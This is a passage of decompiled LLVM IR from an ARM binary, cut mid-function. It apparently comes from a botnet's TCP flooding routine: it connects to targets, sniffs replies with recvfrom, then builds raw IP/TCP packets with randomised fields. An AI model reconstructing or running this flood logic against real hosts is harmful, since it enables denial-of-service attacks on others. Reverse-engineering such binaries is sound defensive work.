  %v1_b12c = urem i32 %v5_ac5c, 2
  %tmp97 = sub nsw i32 0, %v1_b12c
  %v4_b134 = and i32 %tmp97, 32
  %v1_b144 = urem i32 %v6_ac7c, 2
  %tmp98 = sub nsw i32 0, %v1_b144
  %v4_b14c = and i32 %tmp98, 16
  %v1_b15c = urem i32 %v6_ac9c, 2
  %tmp99 = sub nsw i32 0, %v1_b15c
  %v4_b164 = and i32 %tmp99, 8
  %v1_b174 = urem i32 %v6_acbc, 2
  %tmp100 = sub nsw i32 0, %v1_b174
  %v4_b17c = and i32 %tmp100, 4
  %v1_b18c = urem i32 %v6_acdc, 2
  %tmp101 = sub nsw i32 0, %v1_b18c
  %v3_b194 = and i32 %tmp101, 2
  %v1_b1a4 = urem i32 %v6_acfc, 2
  br label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ada0.preheader, %dec_label_pc_af14
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_af14 ], [ %tmp34, %dec_label_pc_ada0.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_af14 ], [ %tmp37, %dec_label_pc_ada0.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_adac = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_adac, i32* %r0.global-to-local, align 4
  %v7_adb0 = icmp eq i32 %v3_adac, -1
  store i1 %v7_adb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_adac, i32* @r5, align 4
  br i1 %v7_adb0, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_adbc:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_aef0
  %v0_adc4 = phi i32 [ %v3_af04, %dec_label_pc_aef0 ], [ %v3_adac, %dec_label_pc_ada0 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_aef0 ], [ %stack_var_-62.0, %dec_label_pc_ada0 ]
  %stack_var_-60.1 = phi i32 [ %v0_afc4, %dec_label_pc_aef0 ], [ %stack_var_-60.0, %dec_label_pc_ada0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_adc4 = call i32 @__libc_fcntl(i32 %v0_adc4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_adcc = or i32 %v2_adc4, 2048
  store i32 %v1_adcc, i32* @r2, align 4
  %v0_add0 = load i32, i32* @r5, align 4
  store i32 %v0_add0, i32* %r0.global-to-local, align 4
  %v2_add4 = call i32 @__libc_fcntl(i32 %v0_add0, i32 4)
  %v3_add8 = load i32, i32* %stack_var_-44, align 4
  %v5_ade0 = mul i32 %v3_add8, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_adf4 = add i32 %v5_ade0, %arg2
  store i32 %v2_adf4, i32* %r3.global-to-local, align 4
  %v1_adf8 = add i32 %v2_adf4, 20
  %v2_adf8 = inttoptr i32 %v1_adf8 to i8*
  %v3_adf8 = load i8, i8* %v2_adf8, align 1
  %v4_adf8 = zext i8 %v3_adf8 to i32
  store i32 %v4_adf8, i32* %r2.global-to-local, align 4
  %v2_adfc = icmp ugt i8 %v3_adf8, 30
  %v7_adfc = icmp eq i8 %v3_adf8, 31
  store i1 %v7_adfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ae00 = xor i1 %v7_adfc, true
  %v3_ae00 = and i1 %v2_adfc, %v2_ae00
  br i1 %v3_ae00, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_adbc
  %v5_ae00 = add i32 %v2_adf4, 16
  %v6_ae00 = inttoptr i32 %v5_ae00 to i32*
  %v7_ae00 = load i32, i32* %v6_ae00, align 4
  store i32 %v7_ae00, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_adbc, %bb
  %v4_ae04 = phi i32 [ %v2_adf4, %dec_label_pc_adbc ], [ %v7_ae00, %bb ]
  %v4_ae04.stack_var_-60.1 = select i1 %v3_ae00, i32 %v4_ae04, i32 %stack_var_-60.1
  %v2_ae08 = xor i1 %v2_adfc, true
  %v3_ae08 = or i1 %v7_adfc, %v2_ae08
  br i1 %v3_ae08, label %dec_label_pc_af50, label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %bb71, %dec_label_pc_af50
  %v0_afc4 = phi i32 [ %v5_afa0, %dec_label_pc_af50 ], [ %v4_ae04.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v9_ae14 = icmp eq i32 %v0_ae14, 65535
  store i1 %v9_ae14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae14, label %dec_label_pc_afac, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_ae0c
  %v4_ae18 = udiv i32 %v0_ae14, 256
  %v2_ae1c = urem i32 %v0_ae14, 256
  store i32 %v2_ae1c, i32* %r2.global-to-local, align 4
  %v5_ae20 = mul nuw nsw i32 %v2_ae1c, 256
  %v6_ae20 = or i32 %v5_ae20, %v4_ae18
  store i32 %v6_ae20, i32* %r3.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  %v2_ae28 = trunc i32 %v6_ae20 to i16
  store i16 %v2_ae28, i16* %v5_ae28, align 2
  br label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %.thread9, %dec_label_pc_afac
  %stack_var_-62.2 = phi i16 [ %v1_afac, %dec_label_pc_afac ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_ae30, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ae38 = load i32, i32* @r5, align 4
  store i32 %v0_ae38, i32* %r0.global-to-local, align 4
  %v3_ae3c = call i32 @__libc_connect(i32 %v0_ae38, i32 %v2_ae30, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ae44 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae44, i32* %r0.global-to-local, align 4
  store i32 %v2_ae44, i32* @r4, align 4
  %v9_aea4 = icmp eq i32 %tmp35, %v0_afc4
  %v4_aecc = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_aea4 to i32
  %v9_aeb8 = icmp eq i1 %v9_aea4, false
  %v9_aed0 = icmp eq i32 %v3_aec4, %v4_aecc
  br label %dec_label_pc_ae60

dec_label_pc_ae50:                                ; preds = %.thread, %dec_label_pc_aec0, %dec_label_pc_aee8, %bb75
  %v2_ae50 = call i32 @__GI_time(i32* null)
  %v0_ae54 = load i32, i32* @r4, align 4
  %v2_ae54 = sub i32 %v2_ae50, %v0_ae54
  store i32 %v2_ae54, i32* %r0.global-to-local, align 4
  %v7_ae58 = icmp eq i32 %v2_ae54, 10
  store i1 %v7_ae58, i1* %cpsr_z.global-to-local, align 1
  %v8_ae5c = icmp sgt i32 %v2_ae54, 10
  br i1 %v8_ae5c, label %dec_label_pc_aef0, label %dec_label_pc_ae60

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ae50, %dec_label_pc_ae30
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ae74, i32* %r1.global-to-local, align 4
  store i32 %v2_ae78, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ae80 = load i32, i32* @sb, align 4
  store i32 %v0_ae80, i32* %r0.global-to-local, align 4
  %v6_ae88 = call i32 @__libc_recvfrom(i32 %v0_ae80, i32 %v2_ae74, i32 256, i32 16384, i32 %v2_ae68, i32 %v2_ae78)
  store i32 %v6_ae88, i32* %r2.global-to-local, align 4
  %v7_ae90 = icmp eq i32 %v6_ae88, -1
  store i1 %v7_ae90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_ae90, label %dec_label_pc_af44, label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae60
  store i32 %v0_afc4, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_aeb0 = icmp eq i32 %v6_ae88, 40
  store i1 %v7_aeb0, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_ae88, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_ae9c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ae50

bb75:                                             ; preds = %dec_label_pc_ae9c
  store i1 %v9_aeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aeb8, label %dec_label_pc_ae50, label %dec_label_pc_aec0

dec_label_pc_aec0:                                ; preds = %bb75
  store i32 %v3_aec4, i32* @lr, align 4
  store i32 %v2_adec, i32* @r3, align 4
  store i32 %v4_aecc, i32* %r2.global-to-local, align 4
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aed0, label %dec_label_pc_aed8, label %dec_label_pc_ae50

dec_label_pc_aed8:                                ; preds = %dec_label_pc_aec0
  store i32 %v4_aed8, i32* %r2.global-to-local, align 4
  store i32 %v1_aedc, i32* @r3, align 4
  store i1 %v2_aee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee0, label %dec_label_pc_afbc, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aed8
  store i1 %v2_aee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee8, label %dec_label_pc_ae50, label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aee8, %dec_label_pc_ae50
  %v0_aef0 = load i32, i32* @r5, align 4
  store i32 %v0_aef0, i32* %r0.global-to-local, align 4
  %v1_aef4 = call i32 @__GI___libc_close(i32 %v0_aef0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_af04 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  %v3_af08 = icmp eq i32 %v3_af04, -1
  %v8_af08 = icmp eq i32 %v3_af04, -1
  store i1 %v8_af08, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_af04, i32* @r5, align 4
  br i1 %v3_af08, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_af14:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ada0, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_ada0 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_aef0 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_ada0 ], [ %v0_afc4, %bb82 ], [ %v0_afc4, %dec_label_pc_aef0 ]
  %v3_af14 = load i32, i32* %stack_var_-44, align 4
  %v1_af18 = add i32 %v3_af14, 1
  store i32 %v1_af18, i32* @r3, align 4
  %v1_af1c = load i32, i32* @r6, align 4
  %v9_af1c = icmp eq i32 %v1_af18, %v1_af1c
  store i1 %v9_af1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af18, i32* %stack_var_-44, align 4
  %v5_af24 = icmp slt i32 %v1_af18, %v1_af1c
  br i1 %v5_af24, label %dec_label_pc_ada0, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af14
  store i32 %v6_ad1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1d8

dec_label_pc_af3c:                                ; preds = %dec_label_pc_ad60
  %v0_af3c = load i32, i32* @sb, align 4
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  %v1_af40 = call i32 @__GI___libc_close(i32 %v0_af3c)
  store i32 %v1_af40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_ae60, %entry, %dec_label_pc_af3c
  %v1_af4c = phi i32 [ %v3_ad50, %entry ], [ %v1_af40, %dec_label_pc_af3c ], [ 0, %dec_label_pc_ae60 ]
  store i32 %v27_ab7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_af4c

dec_label_pc_af50:                                ; preds = %bb71
  %v1_af50 = add i32 %v4_ae04, 16
  %v2_af50 = inttoptr i32 %v1_af50 to i32*
  %v3_af50 = load i32, i32* %v2_af50, align 4
  store i32 %v3_af50, i32* @r4, align 4
  %v0_af54 = call i32 @rand_next()
  store i32 %v0_af54, i32* %r0.global-to-local, align 4
  %v3_af58 = load i32, i32* %stack_var_-44, align 4
  %v5_af60 = mul i32 %v3_af58, 24
  %v0_af68 = load i32, i32* @r4, align 4
  %v1_af68 = and i32 %v0_af68, 16711680
  store i32 %v1_af68, i32* %ip.global-to-local, align 4
  %v3_af6c = udiv i32 %v0_af68, 16777216
  %v2_af70 = add i32 %v5_af60, %arg2
  store i32 %v2_af70, i32* %r1.global-to-local, align 4
  %v4_af74 = udiv i32 %v1_af68, 256
  %v5_af74 = or i32 %v4_af74, %v3_af6c
  store i32 %v5_af74, i32* %r2.global-to-local, align 4
  %v1_af78 = and i32 %v0_af68, 65280
  store i32 %v1_af78, i32* %r3.global-to-local, align 4
  %v1_af7c = add i32 %v2_af70, 20
  %v2_af7c = inttoptr i32 %v1_af7c to i8*
  %v3_af7c = load i8, i8* %v2_af7c, align 1
  %v4_af7c = zext i8 %v3_af7c to i32
  store i32 %v4_af7c, i32* %ip.global-to-local, align 4
  %v5_af84 = call i32 @llvm.bswap.i32(i32 %v0_af68)
  %v7_af88 = lshr i32 %v0_af54, %v4_af7c
  %v8_af88 = add i32 %v7_af88, %v5_af84
  store i32 %v8_af88, i32* %r2.global-to-local, align 4
  %v1_af8c = and i32 %v8_af88, 16711680
  store i32 %v1_af8c, i32* %r0.global-to-local, align 4
  %v1_af98 = and i32 %v8_af88, 65280
  store i32 %v1_af98, i32* %r1.global-to-local, align 4
  %v5_afa0 = call i32 @llvm.bswap.i32(i32 %v8_af88)
  store i32 %v5_afa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ae0c

dec_label_pc_afac:                                ; preds = %dec_label_pc_ae0c
  %v0_afac = call i32 @rand_next()
  %v1_afac = trunc i32 %v0_afac to i16
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  store i32 %v2_adec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ae30

dec_label_pc_afbc:                                ; preds = %dec_label_pc_aed8
  %v3_afbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afbc, i32* @r4, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v5_afc4 = mul i32 %v3_afbc, 16
  %v6_afc4 = add i32 %v5_afc4, %v2_ab98
  %v7_afc4 = inttoptr i32 %v6_afc4 to i32*
  store i32 %v0_afc4, i32* %v7_afc4, align 4
  %v0_afc8 = load i32, i32* @r8, align 4
  %v1_afc8 = add i32 %v0_afc8, 4
  %v2_afc8 = inttoptr i32 %v1_afc8 to i32*
  %v3_afc8 = load i32, i32* %v2_afc8, align 4
  store i32 %v3_afc8, i32* %r1.global-to-local, align 4
  %v1_afd4 = and i32 %v3_afc8, 65280
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  store i32 %v2_ab98, i32* %r0.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  %v3_afe4 = mul i32 %v0_afe4, 16
  %v2_afe8 = add i32 %v3_afe4, %v2_ab98
  store i32 %v2_afe8, i32* %ip.global-to-local, align 4
  %v5_afec = call i32 @llvm.bswap.i32(i32 %v3_afc8)
  store i32 %v5_afec, i32* %r3.global-to-local, align 4
  %v2_aff0 = add i32 %v2_afe8, 4
  %v3_aff0 = inttoptr i32 %v2_aff0 to i32*
  store i32 %v5_afec, i32* %v3_aff0, align 4
  %v0_aff4 = load i32, i32* @r8, align 4
  %v1_aff4 = add i32 %v0_aff4, 8
  %v2_aff4 = inttoptr i32 %v1_aff4 to i32*
  %v3_aff4 = load i32, i32* %v2_aff4, align 4
  store i32 %v3_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = and i32 %v3_aff4, 16711680
  store i32 %v1_aff8, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r2.global-to-local, align 4
  %v5_b010 = call i32 @llvm.bswap.i32(i32 %v3_aff4)
  store i32 %v5_b010, i32* %r3.global-to-local, align 4
  %v1_b014 = add i32 %v0_aff4, 2
  %v2_b014 = inttoptr i32 %v1_b014 to i16*
  %v3_b014 = load i16, i16* %v2_b014, align 2
  %v4_b014 = zext i16 %v3_b014 to i32
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  store i32 %v1_b018, i32* @r7, align 4
  %v0_b01c = load i32, i32* @lr, align 4
  %v1_b01c = trunc i32 %v0_b01c to i16
  %v2_b01c = load i32, i32* %ip.global-to-local, align 4
  %v3_b01c = add i32 %v2_b01c, 14
  %v4_b01c = inttoptr i32 %v3_b01c to i16*
  store i16 %v1_b01c, i16* %v4_b01c, align 2
  %v0_b020 = load i32, i32* %r1.global-to-local, align 4
  %v1_b020 = trunc i32 %v0_b020 to i16
  %v2_b020 = load i32, i32* %ip.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 12
  %v4_b020 = inttoptr i32 %v3_b020 to i16*
  store i16 %v1_b020, i16* %v4_b020, align 2
  %v0_b024 = load i32, i32* %r3.global-to-local, align 4
  %v1_b024 = load i32, i32* %ip.global-to-local, align 4
  %v2_b024 = add i32 %v1_b024, 8
  %v3_b024 = inttoptr i32 %v2_b024 to i32*
  store i32 %v0_b024, i32* %v3_b024, align 4
  %v0_b028 = load i32, i32* @r7, align 4
  store i32 %v0_b028, i32* @r0, align 4
  %v0_b02c = call i32 @malloc()
  store i32 %v0_b02c, i32* %r0.global-to-local, align 4
  store i32 %v2_aba8, i32* %r3.global-to-local, align 4
  %v2_b038 = load i32, i32* @r4, align 4
  %v5_b038 = mul i32 %v2_b038, 4
  %v6_b038 = add i32 %v5_b038, %v2_aba8
  %v7_b038 = inttoptr i32 %v6_b038 to i32*
  store i32 %v0_b02c, i32* %v7_b038, align 4
  %v3_b03c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b03c, i32* %r2.global-to-local, align 4
  %v0_b040 = load i32, i32* %r3.global-to-local, align 4
  %v4_b040 = mul i32 %v3_b03c, 4
  %v5_b040 = add i32 %v0_b040, %v4_b040
  %v6_b040 = inttoptr i32 %v5_b040 to i32*
  %v7_b040 = load i32, i32* %v6_b040, align 4
  store i32 %v7_b040, i32* @r4, align 4
  %v1_b044 = inttoptr i32 %v7_b040 to i8*
  %v2_b044 = load i8, i8* %v1_b044, align 1
  %tmp103 = urem i8 %v2_b044, 16
  %v1_b048 = zext i8 %tmp103 to i32
  %v1_b04c = or i32 %v1_b048, 64
  store i32 %v1_b04c, i32* %r3.global-to-local, align 4
  %v1_b050 = trunc i32 %v1_b04c to i8
  store i8 %v1_b050, i8* %v1_b044, align 1
  %v0_b054 = load i32, i32* @r4, align 4
  %v1_b054 = inttoptr i32 %v0_b054 to i8*
  %v2_b054 = load i8, i8* %v1_b054, align 1
  %v0_b058 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b058, 256
  %v1_b060 = and i8 %v2_b054, -16
  %v1_b064 = or i8 %v1_b060, 5
  %v1_b068 = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b058, 256
  %v4_b06c = urem i32 %tmp78, 256
  %v5_b06c = or i32 %v4_b06c, %v1_b068
  store i32 %v5_b06c, i32* %r2.global-to-local, align 4
  %v0_b070 = load i32, i32* @fp, align 4
  %v1_b070 = urem i32 %v0_b070, 256
  store i32 %v1_b070, i32* %r0.global-to-local, align 4
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  %v3_b078 = udiv i32 %v0_b070, 256
  store i32 %v3_b078, i32* %r1.global-to-local, align 4
  store i8 %v1_b064, i8* %v1_b054, align 1
  %v0_b080 = load i32, i32* %r1.global-to-local, align 4
  %v1_b080 = load i32, i32* %r0.global-to-local, align 4
  %v4_b080 = mul i32 %v1_b080, 256
  %v5_b080 = or i32 %v4_b080, %v0_b080
  store i32 %v5_b080, i32* %r1.global-to-local, align 4
  store i32 %v4_b084, i32* %r0.global-to-local, align 4
  %v2_b088 = load i32, i32* @r4, align 4
  %v3_b088 = add i32 %v2_b088, 1
  %v4_b088 = inttoptr i32 %v3_b088 to i8*
  store i8 %v5_abe0, i8* %v4_b088, align 1
  %v0_b08c = load i32, i32* %r1.global-to-local, align 4
  %v1_b08c = trunc i32 %v0_b08c to i16
  %v2_b08c = load i32, i32* @r4, align 4
  %v3_b08c = add i32 %v2_b08c, 4
  %v4_b08c = inttoptr i32 %v3_b08c to i16*
  store i16 %v1_b08c, i16* %v4_b08c, align 2
  %v0_b090 = load i32, i32* %ip.global-to-local, align 4
  %v2_b090 = icmp eq i32 %v0_b090, 0
  store i1 %v2_b090, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b094, i32* %r1.global-to-local, align 4
  %v0_b098 = load i32, i32* %r2.global-to-local, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r4, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b090, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_afbc
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_afbc, %bb79
  %v0_b0a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v0_b0a4 to i8
  %v2_b0a4 = load i32, i32* @r4, align 4
  %v3_b0a4 = add i32 %v2_b0a4, 8
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a8 = trunc i32 %v0_b0a8 to i8
  %v2_b0a8 = load i32, i32* @r4, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 9
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b0a8, i8* %v4_b0a8, align 1
  %v0_b0ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0ac, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b0ac = load i32, i32* %r2.global-to-local, align 4
  %v2_b0ac = trunc i32 %v1_b0ac to i16
  %v3_b0ac = load i32, i32* @r4, align 4
  %v4_b0ac = add i32 %v3_b0ac, 6
  %v5_b0ac = inttoptr i32 %v4_b0ac to i16*
  store i16 %v2_b0ac, i16* %v5_b0ac, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r2.global-to-local, align 4
  %v2_b0b4 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_b0b4, i32* %r1.global-to-local, align 4
  %v1_b0b8 = load i32, i32* @r4, align 4
  %v2_b0b8 = add i32 %v1_b0b8, 12
  %v3_b0b8 = inttoptr i32 %v2_b0b8 to i32*
  store i32 %v2_b0b4, i32* %v3_b0b8, align 4
  %v3_b0bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b0bc, i32* %r3.global-to-local, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v4_b0c4 = mul i32 %v3_b0bc, 16
  %v5_b0c4 = add i32 %v4_b0c4, %v2_ab98
  %v6_b0c4 = inttoptr i32 %v5_b0c4 to i32*
  %v7_b0c4 = load i32, i32* %v6_b0c4, align 4
  store i32 %v7_b0c4, i32* %r2.global-to-local, align 4
  store i32 %v5_b0c4, i32* %r3.global-to-local, align 4
  %v1_b0d0 = load i32, i32* @r4, align 4
  %v2_b0d0 = add i32 %v1_b0d0, 16
  %v3_b0d0 = inttoptr i32 %v2_b0d0 to i32*
  store i32 %v7_b0c4, i32* %v3_b0d0, align 4
  %v0_b0d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0d4 = add i32 %v0_b0d4, 12
  %v2_b0d4 = inttoptr i32 %v1_b0d4 to i16*
  %v3_b0d4 = load i16, i16* %v2_b0d4, align 2
  %v4_b0d4 = zext i16 %v3_b0d4 to i32
  store i32 %v4_b0d4, i32* %r0.global-to-local, align 4
  %v1_b0d8 = add i32 %v0_b0d4, 8
  %v2_b0d8 = inttoptr i32 %v1_b0d8 to i32*
  %v3_b0d8 = load i32, i32* %v2_b0d8, align 4
  store i32 %v3_b0d8, i32* %r1.global-to-local, align 4
  %v2_b0dc = load i32, i32* @r4, align 4
  %v3_b0dc = add i32 %v2_b0dc, 20
  %v4_b0dc = inttoptr i32 %v3_b0dc to i16*
  store i16 %v3_b0d4, i16* %v4_b0dc, align 2
  %v0_b0e0 = load i32, i32* @r4, align 4
  %v1_b0e0 = add i32 %v0_b0e0, 20
  store i32 %v1_b0e0, i32* @r8, align 4
  %v1_b0e4 = add i32 %v0_b0e0, 33
  %v2_b0e4 = inttoptr i32 %v1_b0e4 to i8*
  %v3_b0e4 = load i8, i8* %v2_b0e4, align 1
  %v4_b0e4 = zext i8 %v3_b0e4 to i32
  store i32 %v4_b0e4, i32* %r2.global-to-local, align 4
  %v0_b0e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0e8 = add i32 %v0_b0e0, 24
  %v3_b0e8 = inttoptr i32 %v2_b0e8 to i32*
  store i32 %v0_b0e8, i32* %v3_b0e8, align 4
  %v0_b0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b0ec = or i32 %v0_b0ec, 1
  store i32 %v1_b0ec, i32* %r2.global-to-local, align 4
  %v0_b0f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0f0 = add i32 %v0_b0f0, 4
  %v2_b0f0 = inttoptr i32 %v1_b0f0 to i32*
  %v3_b0f0 = load i32, i32* %v2_b0f0, align 4
  store i32 %v3_b0f0, i32* %r1.global-to-local, align 4
  %v1_b0f4 = add i32 %v0_b0f0, 14
  %v2_b0f4 = inttoptr i32 %v1_b0f4 to i16*
  %v3_b0f4 = load i16, i16* %v2_b0f4, align 2
  %v4_b0f4 = zext i16 %v3_b0f4 to i32
  store i32 %v4_b0f4, i32* %r3.global-to-local, align 4
  %v1_b0f8 = trunc i32 %v1_b0ec to i8
  %v2_b0f8 = load i32, i32* @r8, align 4
  %v3_b0f8 = add i32 %v2_b0f8, 13
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i8*
  store i8 %v1_b0f8, i8* %v4_b0f8, align 1
  %v0_b0fc = load i32, i32* %r3.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r8, align 4
  %v3_b0fc = add i32 %v2_b0fc, 2
  %v4_b0fc = inttoptr i32 %v3_b0fc to i16*
  store i16 %v1_b0fc, i16* %v4_b0fc, align 2
  %v0_b100 = load i32, i32* @r8, align 4
  %v1_b100 = add i32 %v0_b100, 12
  %v2_b100 = inttoptr i32 %v1_b100 to i8*
  %v3_b100 = load i8, i8* %v2_b100, align 1
  %v4_b100 = zext i8 %v3_b100 to i32
  store i32 %v4_b100, i32* %r3.global-to-local, align 4
  %v1_b104 = add i32 %v0_b100, 13
  %v2_b104 = inttoptr i32 %v1_b104 to i8*
  %v3_b104 = load i8, i8* %v2_b104, align 1
  %v4_b104 = zext i8 %v3_b104 to i32
  %tmp104 = urem i8 %v3_b100, 16
  %v1_b108 = zext i8 %tmp104 to i32
  %v1_b10c = or i32 %v1_b108, 128
  store i32 %v1_b10c, i32* %r3.global-to-local, align 4
  %v1_b110 = or i32 %v4_b104, 16
  store i32 %v1_b110, i32* %r2.global-to-local, align 4
  %v0_b114 = load i32, i32* %r1.global-to-local, align 4
  %v2_b114 = add i32 %v0_b100, 8
  %v3_b114 = inttoptr i32 %v2_b114 to i32*
  store i32 %v0_b114, i32* %v3_b114, align 4
  %v0_b118 = load i32, i32* %r3.global-to-local, align 4
  %v1_b118 = trunc i32 %v0_b118 to i8
  %v2_b118 = load i32, i32* @r8, align 4
  %v3_b118 = add i32 %v2_b118, 12
  %v4_b118 = inttoptr i32 %v3_b118 to i8*
  store i8 %v1_b118, i8* %v4_b118, align 1
  %v0_b11c = load i32, i32* %r2.global-to-local, align 4
  %v1_b11c = trunc i32 %v0_b11c to i8
  %v2_b11c = load i32, i32* @r8, align 4
  %v3_b11c = add i32 %v2_b11c, 13
  %v4_b11c = inttoptr i32 %v3_b11c to i8*
  store i8 %v1_b11c, i8* %v4_b11c, align 1
  %v0_b120 = call i32 @rand_next()
  %v1_b120 = trunc i32 %v0_b120 to i16
  store i32 %v0_b120, i32* %r0.global-to-local, align 4
  store i32 %v1_ac64, i32* %r1.global-to-local, align 4
  %v0_b128 = load i32, i32* @r8, align 4
  %v1_b128 = add i32 %v0_b128, 13
  %v2_b128 = inttoptr i32 %v1_b128 to i8*
  %v3_b128 = load i8, i8* %v2_b128, align 1
  %v4_b128 = zext i8 %v3_b128 to i32
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v1_b130 = and i32 %v4_b128, 223
  %v5_b134 = or i32 %v1_b130, %v4_b134
  store i32 %v5_b134, i32* %r3.global-to-local, align 4
